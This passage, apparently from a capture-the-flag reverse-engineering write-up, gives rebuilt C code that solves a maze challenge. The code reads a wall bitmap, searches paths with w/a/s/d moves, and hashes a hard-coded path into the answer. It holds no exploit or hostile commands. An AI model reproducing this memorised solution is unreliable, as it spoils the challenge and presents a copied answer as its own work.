class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> a[]=&#123;<span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <br><span class="hljs-number">0xBF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0xA4</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <br><span class="hljs-number">0x80</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xFF</span>, <br><span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xFF</span>, <br><span class="hljs-number">0xC0</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xFF</span>, <br><span class="hljs-number">0xDF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0xDD</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <br><span class="hljs-number">0xC0</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xFF</span>, <br><span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xFF</span>, <br><span class="hljs-number">0xC0</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xFF</span>, <br><span class="hljs-number">0xDF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <br><span class="hljs-number">0xC0</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0xBC</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0x1F</span>, <br><span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0xDF</span>, <br><span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0xBD</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0xDF</span>, <br><span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0xDF</span>, <br><span class="hljs-number">0x80</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0xDF</span>, <br><span class="hljs-number">0xBF</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xDF</span>, <br><span class="hljs-number">0x96</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xDF</span>, <br><span class="hljs-number">0x96</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xDF</span>, <br><span class="hljs-number">0x95</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xDF</span>, <br><span class="hljs-number">0x95</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xDF</span>, <br><span class="hljs-number">0xAA</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0xDF</span>, <br><span class="hljs-number">0x92</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xF6</span>, <span class="hljs-number">0xDF</span>, <br><span class="hljs-number">0x92</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0xDF</span>, <br><span class="hljs-number">0x8A</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xDF</span>, <br><span class="hljs-number">0xAE</span>, <span class="hljs-number">0xD5</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0xDF</span>, <br><span class="hljs-number">0x95</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0xDF</span>, <br><span class="hljs-number">0x8A</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0xDF</span>, <br><span class="hljs-number">0xBF</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0xDF</span>, <br><span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xF5</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0xDF</span>, <br><span class="hljs-number">0x80</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0xD5</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0xDF</span>, <br><span class="hljs-number">0xBF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xBD</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xDF</span>, <br><span class="hljs-number">0xA0</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xDF</span>, <br><span class="hljs-number">0xAF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xDF</span>, <br><span class="hljs-number">0xA0</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0xDF</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xDF</span>, <br><span class="hljs-number">0xBF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0xDF</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xDF</span>, <br><span class="hljs-number">0xA0</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0xDF</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xDF</span>, <br><span class="hljs-number">0xAF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xDF</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xDF</span>, <br><span class="hljs-number">0xA0</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0xDF</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xDF</span>, <br><span class="hljs-number">0xBF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0xDF</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xDF</span>, <br><span class="hljs-number">0xBC</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0xDF</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xDF</span>, <br><span class="hljs-number">0xA9</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x9F</span>, <span class="hljs-number">0xDF</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0x5F</span>, <br><span class="hljs-number">0xB2</span>, <span class="hljs-number">0xA1</span>, <span class="hljs-number">0xCF</span>, <span class="hljs-number">0xDF</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x5F</span>, <br><span class="hljs-number">0xB1</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0xDF</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0x5F</span>, <br><span class="hljs-number">0xAA</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0xE0</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0x5F</span>, <br><span class="hljs-number">0xBD</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xDF</span>, <br><span class="hljs-number">0xB2</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0xB0</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xDF</span>, <br><span class="hljs-number">0xB4</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0xB7</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xDF</span>, <br><span class="hljs-number">0xB2</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0xB0</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xDF</span>, <br><span class="hljs-number">0xB2</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xDF</span>, <br><span class="hljs-number">0xB2</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xDF</span>, <br><span class="hljs-number">0xB2</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xDF</span>, <br><span class="hljs-number">0xB2</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xDF</span>, <br><span class="hljs-number">0xB0</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xDF</span>, <br><span class="hljs-number">0xBC</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xE0</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xDF</span>, <br><span class="hljs-number">0x80</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x8A</span>, <span class="hljs-number">0x5F</span>, <br><span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>&#125;;<br><span class="hljs-type">int</span> <span class="hljs-title function_">sub_7FF78A1D1190</span><span class="hljs-params">(<span class="hljs-type">int</span> a1, <span class="hljs-type">int</span> a2)</span><br>&#123;<br><span class="hljs-type">unsigned</span> __int8 v3; <span class="hljs-comment">// [rsp+0h] [rbp-28h]</span><br><span class="hljs-keyword">if</span> ( a1 &gt; <span class="hljs-number">80</span> || a2 &gt; <span class="hljs-number">56</span> || a1 &lt; <span class="hljs-number">1</span> || a2 &lt; <span class="hljs-number">1</span> )&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br>v3 = a[<span class="hljs-number">10</span> * a2 - <span class="hljs-number">10</span> + (a1 - <span class="hljs-number">1</span>) / <span class="hljs-number">8</span>];<br>a[<span class="hljs-number">10</span> * a2 - <span class="hljs-number">10</span> + (a1 - <span class="hljs-number">1</span>) / <span class="hljs-number">8</span>] = (<span class="hljs-number">1</span> &lt;&lt; (<span class="hljs-number">7</span> - (a1 - <span class="hljs-number">1</span>) % <span class="hljs-number">8</span>)) | v3;<br><span class="hljs-keyword">return</span> ((<span class="hljs-type">int</span>)v3 &gt;&gt; (<span class="hljs-number">7</span> - (a1 - <span class="hljs-number">1</span>) % <span class="hljs-number">8</span>)) &amp; <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br><span class="hljs-type">int</span> v4=<span class="hljs-number">2</span>;<br><span class="hljs-type">int</span> v5=<span class="hljs-number">2</span>;<br><span class="hljs-type">char</span> out[<span class="hljs-number">1200</span>]=&#123;<span class="hljs-string">&#x27;0&#x27;</span>&#125;;<br><span class="hljs-type">int</span> k=<span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> pan=<span class="hljs-number">0</span>;<br><span class="hljs-type">char</span> v7[<span class="hljs-number">4</span>]=&#123;<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>&#125;;<br><span class="hljs-keyword">while</span>(k&lt;<span class="hljs-number">1176</span>)&#123;<br><span class="hljs-keyword">if</span>(k==<span class="hljs-number">950</span>)&#123;<br>v7[<span class="hljs-number">0</span>]=<span class="hljs-string">&#x27;a&#x27;</span>;<br>v7[<span class="hljs-number">1</span>]=<span class="hljs-string">&#x27;w&#x27;</span>;<br>v7[<span class="hljs-number">2</span>]=<span class="hljs-string">&#x27;d&#x27;</span>;<br>v7[<span class="hljs-number">3</span>]=<span class="hljs-string">&#x27;s&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">4</span>;i++)&#123;<br><span class="hljs-keyword">switch</span> ( v7[i] )&#123;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;a&#x27;</span>:<br><span class="hljs-keyword">if</span> ( v5 &lt;= <span class="hljs-number">1</span> || (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)sub_7FF78A1D1190((v5 - <span class="hljs-number">1</span>), v4))&#123;&#125;<br><span class="hljs-keyword">else</span>&#123;<br>--v5;<br>out[k++]=v7[i];<br>pan=<span class="hljs-number">1</span>;        <br>&#125;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;d&#x27;</span>:<br><span class="hljs-keyword">if</span> ( v5 &gt;= <span class="hljs-number">80</span> || (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)sub_7FF78A1D1190((v5 + <span class="hljs-number">1</span>), v4) )&#123;&#125;<br><span class="hljs-keyword">else</span>&#123;<br>++v5;<br>out[k++]=v7[i];<br>pan=<span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;s&#x27;</span>:<br><span class="hljs-keyword">if</span> ( v4 &gt;= <span class="hljs-number">56</span> || (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)sub_7FF78A1D1190(v5, (v4 + <span class="hljs-number">1</span>)) )&#123;&#125;<br><span class="hljs-keyword">else</span>&#123;<br>++v4;<br>out[k++]=v7[i];<br>pan=<span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;w&#x27;</span>:<br><span class="hljs-keyword">if</span> ( v4 &lt;= <span class="hljs-number">1</span> || (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)sub_7FF78A1D1190(v5, (v4 - <span class="hljs-number">1</span>)) )&#123;&#125;<br><span class="hljs-keyword">else</span>&#123;<br>--v4;<br>out[k++]=v7[i];<br>pan=<span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">if</span>(pan==<span class="hljs-number">1</span>)&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>,k);<br><span class="hljs-comment">//printf(&quot;%c&quot;,v7[i]);</span><br>pan=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br>&#125;<br><br>&#125;<br><span class="hljs-keyword">if</span> ( v5 == <span class="hljs-number">75</span> &amp;&amp; v4 == <span class="hljs-number">55</span> )&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;success!&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>,out);<br>&#125;<br><span class="hljs-type">char</span> s[]=<span class="hljs-string">&quot;sddddddddddddddddssaaaaaaaaaaaaaaassdddddddddddddddssaaaaaaaaaaaaaaassdddddddddddddddsssdsdssddddddddddddddddssaaaaaaaaaaaaaaassdddddddddddddddssaaaaaaaaaaaaaaassdddddddddddddddsssdddwdddddddddddddddwwaaaaaaaaaaaaaaawwdddddddddddddddwwaaaaaaaaaaaaaaawwdddddddddddddddwwaaaaaaaaaaaaaaaawwddddddddddddddddwwwwaaaaaaaaaaaaaaawwdddddddddddddddwwaaaaaaaaaaaaaaawwdddddddddddddddwwddddddddddddddddddssaaaaaaaaaaaaaaassdddddddddddddddssaaaaaaaaaaaaaaassdddddddddssssaaaaaaaaaassdddddddssaaaaaassddddddddddddssaaaaaaaaaaaassdddddddddddsssssaaaaaaaaaaaaaassaaaaaaaaaaaaaaassdddddddddddddddssaaaaaaaaaaaaaaassdddddddddddddddssssaaaaaaaaaaaaaaaassddddddddddddddddssaaaaaaaaaaaaaaassdddddddddddddddssaaaaaaaaaaaaaaassaaaaaaaaaaaaaaaaaawwdddddddddddddddwwaaaaaaaaaaaaaaawwdddddddddddddddwwaaaaaaaaaaaaaaaawwawawwwaaaaaaaaaaaaaawwddddddddddddddwwaaaaaaaaaaaaaawwddddddddddddddwwaaaaaaaaaaaaaaaasssssssssssssssssssssssssddddddddddddddddddddddddddddddddddwddddddddddddddddddwdddwwwdddddddddddddddwwaaaaaaaaaaaaaaawwddddddwwaaaaaaawwddddddddddddddssdddwwwawwwaaaaaaaaaaaaaaawwdddddddddddddddwwaaaaaaaaaaaaaaawwdddddddddddddddwwwwwwwwwwwwwwwwwwwwwdddssssssssssssssssssssssssssssssssssssssssssss&quot;</span>;<br><span class="hljs-type">long</span> <span class="hljs-type">long</span> v3=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">1176</span>;i++)<br>v3 += i * <span class="hljs-number">3113131</span> *(<span class="hljs-type">int</span>)(s[i]) + i * i + <span class="hljs-number">1131796</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%llu&quot;</span>,v3);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Just-Run-It"><a href="#Just-Run-It" class="headerlink" title="Just_Run_It"></a>Just_Run_It</h2><p>0x0和0x1都是脱壳后解码</p><img 